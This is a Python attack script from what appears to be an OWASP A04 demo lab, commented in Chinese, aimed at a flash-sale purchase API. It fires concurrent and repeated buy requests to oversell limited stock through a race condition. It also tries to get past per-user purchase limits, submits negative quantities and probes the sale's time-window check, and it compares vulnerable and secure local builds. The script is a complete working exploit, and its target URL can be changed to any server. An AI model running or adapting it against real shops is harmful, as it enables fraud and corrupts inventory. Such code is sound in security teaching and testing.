#!/usr/bin/env python3
"""
OWASP A04:2021 - Inventory Race Condition Attack Script
=========================================================
測試限量商品的競態條件漏洞

CWE-799: Improper Control of Interaction Frequency
CWE-841: Improper Enforcement of Behavioral Workflow

Author: OWASP Demo
"""

import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

print_lock = Lock()


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║  ██████╗  █████╗  ██████╗███████╗                                          ║
║  ██╔══██╗██╔══██╗██╔════╝██╔════╝                                          ║
║  ██████╔╝███████║██║     █████╗                                            ║
║  ██╔══██╗██╔══██║██║     ██╔══╝                                            ║
║  ██║  ██║██║  ██║╚██████╗███████╗                                          ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝                                          ║
║   ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗     ║
║  ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║     ║
║  ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║     ║
║  ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║     ║
║  ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║     ║
║   ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ║
║                                                                             ║
║  OWASP A04:2021 - Race Condition Attack Script                             ║
║  CWE-799/841: Improper Concurrency Control                                  ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def get_flash_sales(base_url):
    """獲取限時特賣活動"""
    try:
        response = requests.get(f"{base_url}/api/flash-sale/active", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return []


def reset_flash_sale(base_url, sale_id):
    """重設限時特賣"""
    try:
        requests.post(f"{base_url}/api/flash-sale/reset/{sale_id}", timeout=5)
    except:
        pass


def attack_race_condition(base_url, threads=20, sale_id=1):
    """競態條件攻擊 - 多線程同時購買"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Race Condition Attack - 競態條件攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/flash-sale/buy")
    print(f"攻擊原理: 多個請求同時檢查庫存，在更新前都通過檢查")
    
    # 重設活動
    reset_flash_sale(base_url, sale_id)
    
    # 獲取活動資訊
    sales = get_flash_sales(base_url)
    target_sale = None
    for sale in sales:
        if sale.get("id") == sale_id:
            target_sale = sale
            break
    
    if target_sale:
        print(f"\n[*] 限時特賣活動:")
        print(f"    產品: {target_sale.get('productName', 'Unknown')}")
        print(f"    原價: ${target_sale.get('originalPrice', 'N/A')}")
        print(f"    特價: ${target_sale.get('salePrice', 'N/A')}")
        print(f"    庫存限制: {target_sale.get('stockLimit', 'N/A')}")
        print(f"    每人限購: {target_sale.get('perUserLimit', 'N/A')}")
    else:
        print(f"\n{YELLOW}[*] 無法獲取活動資訊，繼續攻擊...{RESET}")
    
    print(f"\n[*] 啟動 {threads} 個並發線程...")
    
    success_count = 0
    fail_count = 0
    results = []
    
    def buy_item(user_id):
        try:
            response = requests.post(
                f"{base_url}/api/flash-sale/buy",
                json={
                    "saleId": sale_id,
                    "userId": user_id,
                    "quantity": 1
                },
                timeout=10
            )
            return user_id, response.status_code, response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
        except Exception as e:
            return user_id, 0, {"error": str(e)}
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(buy_item, i) for i in range(1, threads + 1)]
        
        for future in as_completed(futures):
            user_id, status, data = future.result()
            results.append((user_id, status, data))
            
            if status == 200 and data.get("success"):
                success_count += 1
                with print_lock:
                    print(f"    {GREEN}User {user_id}: 購買成功{RESET}")
            else:
                fail_count += 1
                error = data.get("error", "Unknown")
                with print_lock:
                    print(f"    {RED}User {user_id}: 失敗 - {error}{RESET}")
    
    duration = time.time() - start_time
    
    # 獲取最終狀態
    sales = get_flash_sales(base_url)
    final_stock = 0
    stock_limit = 10
    for sale in sales:
        if sale.get("id") == sale_id:
            final_stock = sale.get("soldCount", 0)
            stock_limit = sale.get("stockLimit", 10)
    
    print(f"\n[*] 攻擊結果:")
    print(f"    並發請求: {threads}")
    print(f"    成功購買: {success_count}")
    print(f"    失敗: {fail_count}")
    print(f"    耗時: {duration:.2f} 秒")
    print(f"    庫存限制: {stock_limit}")
    print(f"    已售出: {final_stock}")
    
    if success_count > stock_limit:
        print(f"\n{RED}[VULNERABLE] 超賣！成功購買數量 ({success_count}) 超過庫存限制 ({stock_limit}){RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 沒有超賣，庫存控制正常{RESET}")
        return False


def attack_rapid_buy(base_url, sale_id=1, user_id=100):
    """快速連續購買攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] Rapid Buy Attack - 快速連續購買{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/flash-sale/rapid-buy")
    print(f"攻擊原理: 利用處理延遲期間的競態條件")
    
    reset_flash_sale(base_url, sale_id)
    
    success_count = 0
    
    # 快速發送多個請求
    for i in range(5):
        try:
            response = requests.post(
                f"{base_url}/api/flash-sale/rapid-buy",
                json={
                    "saleId": sale_id,
                    "userId": user_id
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get("success"):
                    success_count += 1
                    print(f"    請求 {i+1}: {GREEN}成功{RESET}")
                else:
                    print(f"    請求 {i+1}: {RED}失敗 - {data.get('error', 'Unknown')}{RESET}")
            else:
                print(f"    請求 {i+1}: {RED}狀態 {response.status_code}{RESET}")
                
        except Exception as e:
            print(f"    請求 {i+1}: {RED}錯誤 - {e}{RESET}")
    
    print(f"\n[*] 同一用戶成功購買: {success_count} 次")
    
    if success_count > 1:
        print(f"\n{RED}[VULNERABLE] 同一用戶可多次購買！繞過每人限購限制{RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 每人限購限制正常{RESET}")
        return False


def attack_negative_quantity(base_url, sale_id=1):
    """負數數量攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Negative Quantity Attack - 負數數量攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/flash-sale/buy")
    print(f"攻擊原理: 使用負數數量操縱庫存")
    
    try:
        response = requests.post(
            f"{base_url}/api/flash-sale/buy",
            json={
                "saleId": sale_id,
                "userId": 999,
                "quantity": -5  # 負數數量
            },
            timeout=10
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                print(f"\n{RED}[VULNERABLE] 負數數量被接受！{RESET}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 負數數量被拒絕{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 請求被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_time_manipulation(base_url, sale_id=1):
    """時間窗口繞過"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Time Window Attack - 時間窗口繞過{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/flash-sale/buy")
    print(f"攻擊原理: 在活動結束後仍嘗試購買")
    
    # 獲取活動資訊
    sales = get_flash_sales(base_url)
    
    print(f"\n[*] 當前活動狀態:")
    for sale in sales:
        status = "活躍" if sale.get("active") else "已結束"
        print(f"    ID {sale.get('id')}: {sale.get('productName')} - {status}")
    
    # 嘗試購買（即使活動可能已結束）
    try:
        response = requests.post(
            f"{base_url}/api/flash-sale/buy",
            json={
                "saleId": sale_id,
                "userId": 888,
                "quantity": 1
            },
            timeout=10
        )
        
        print(f"\n[*] 購買嘗試響應: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                print(f"\n{YELLOW}[INFO] 購買成功 - 請手動驗證時間窗口檢查{RESET}")
            else:
                error = data.get("error", "Unknown")
                if "time" in error.lower() or "ended" in error.lower():
                    print(f"\n{GREEN}[PROTECTED] 時間窗口檢查生效{RESET}")
                else:
                    print(f"\n[INFO] 失敗原因: {error}")
                    
    except Exception as e:
        print(f"    [ERROR] {e}")


def attack_distributed_race(base_url, sale_id=1, users_per_wave=10, waves=3):
    """分布式競態攻擊 - 模擬多波次攻擊"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Distributed Race Attack - 分布式競態攻擊{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/flash-sale/buy")
    print(f"攻擊原理: 多波次並發請求，模擬分布式攻擊")
    
    reset_flash_sale(base_url, sale_id)
    
    total_success = 0
    
    def wave_attack(wave_num, start_user_id):
        nonlocal total_success
        wave_success = 0
        
        def buy_item(user_id):
            try:
                response = requests.post(
                    f"{base_url}/api/flash-sale/buy",
                    json={
                        "saleId": sale_id,
                        "userId": user_id,
                        "quantity": 1
                    },
                    timeout=10
                )
                if response.status_code == 200:
                    data = response.json()
                    return data.get("success", False)
            except:
                pass
            return False
        
        with ThreadPoolExecutor(max_workers=users_per_wave) as executor:
            futures = [executor.submit(buy_item, start_user_id + i) for i in range(users_per_wave)]
            for future in as_completed(futures):
                if future.result():
                    wave_success += 1
        
        return wave_success
    
    print(f"\n[*] 發起 {waves} 波攻擊，每波 {users_per_wave} 用戶")
    
    for wave in range(waves):
        start_user = wave * users_per_wave + 1
        success = wave_attack(wave + 1, start_user)
        total_success += success
        print(f"    波次 {wave + 1}: {success}/{users_per_wave} 成功")
        time.sleep(0.1)  # 短暫延遲
    
    # 獲取最終狀態
    sales = get_flash_sales(base_url)
    stock_limit = 10
    sold_count = 0
    for sale in sales:
        if sale.get("id") == sale_id:
            stock_limit = sale.get("stockLimit", 10)
            sold_count = sale.get("soldCount", 0)
    
    print(f"\n[*] 攻擊結果:")
    print(f"    總請求: {waves * users_per_wave}")
    print(f"    總成功: {total_success}")
    print(f"    庫存限制: {stock_limit}")
    print(f"    實際售出: {sold_count}")
    
    if total_success > stock_limit or sold_count > stock_limit:
        print(f"\n{RED}[VULNERABLE] 分布式攻擊成功！超賣 {max(total_success, sold_count) - stock_limit} 件{RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 庫存控制正常{RESET}")
        return False


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    tests = [
        ("競態條件 (20並發)", lambda url: attack_race_condition(url, threads=20, sale_id=1)),
        ("快速連續購買", lambda url: attack_rapid_buy(url, sale_id=1, user_id=100)),
        ("負數數量", lambda url: attack_negative_quantity(url, sale_id=1)),
    ]
    
    results = {
        "漏洞版本": {},
        "安全版本": {}
    }
    
    for test_name, test_func in tests:
        print(f"\n\n{YELLOW}========== 測試: {test_name} =========={RESET}")
        
        print(f"\n{BLUE}--- 漏洞版本 ---{RESET}")
        vuln_result = test_func(VULNERABLE_URL)
        results["漏洞版本"][test_name] = vuln_result
        
        print(f"\n{BLUE}--- 安全版本 ---{RESET}")
        secure_result = test_func(SECURE_URL)
        results["安全版本"][test_name] = secure_result
    
    # 摘要
    print(f"\n\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}結果摘要{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n{'測試項目':<25} {'漏洞版本':<15} {'安全版本':<15}")
    print("-" * 55)
    
    for test_name, _ in tests:
        vuln_status = f"{RED}VULNERABLE{RESET}" if results["漏洞版本"].get(test_name) else f"{GREEN}OK{RESET}"
        secure_status = f"{RED}VULNERABLE{RESET}" if results["安全版本"].get(test_name) else f"{GREEN}PROTECTED{RESET}"
        print(f"{test_name:<25} {vuln_status:<25} {secure_status:<25}")


def main():
    parser = argparse.ArgumentParser(
        description="Inventory Race Condition Attack Script for OWASP A04 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 inventory_race.py --race          # 競態條件攻擊
  python3 inventory_race.py --rapid         # 快速連續購買
  python3 inventory_race.py --negative      # 負數數量攻擊
  python3 inventory_race.py --time          # 時間窗口繞過
  python3 inventory_race.py --distributed   # 分布式攻擊
  python3 inventory_race.py --all           # 所有攻擊
  python3 inventory_race.py --compare       # 比較版本
        """
    )
    
    parser.add_argument("--race", action="store_true", help="競態條件攻擊")
    parser.add_argument("--rapid", action="store_true", help="快速連續購買")
    parser.add_argument("--negative", action="store_true", help="負數數量攻擊")
    parser.add_argument("--time", action="store_true", help="時間窗口繞過")
    parser.add_argument("--distributed", action="store_true", help="分布式攻擊")
    parser.add_argument("--all", action="store_true", help="所有攻擊")
    parser.add_argument("--compare", action="store_true", help="比較版本")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    parser.add_argument("--threads", type=int, default=20, help="並發線程數")
    parser.add_argument("--sale-id", type=int, default=1, help="限時特賣 ID")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.compare:
        compare_vulnerability()
    elif args.all:
        attack_race_condition(args.url, threads=args.threads, sale_id=args.sale_id)
        attack_rapid_buy(args.url, sale_id=args.sale_id)
        attack_negative_quantity(args.url, sale_id=args.sale_id)
        attack_time_manipulation(args.url, sale_id=args.sale_id)
        attack_distributed_race(args.url, sale_id=args.sale_id)
    else:
        if args.race:
            attack_race_condition(args.url, threads=args.threads, sale_id=args.sale_id)
        if args.rapid:
            attack_rapid_buy(args.url, sale_id=args.sale_id)
        if args.negative:
            attack_negative_quantity(args.url, sale_id=args.sale_id)
        if args.time:
            attack_time_manipulation(args.url, sale_id=args.sale_id)
        if args.distributed:
            attack_distributed_race(args.url, sale_id=args.sale_id)
        
        if not any([args.race, args.rapid, args.negative, args.time, args.distributed]):
            attack_race_condition(args.url, threads=args.threads, sale_id=args.sale_id)
    
    print(f"\n{BLUE}[*] Inventory Race Condition 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
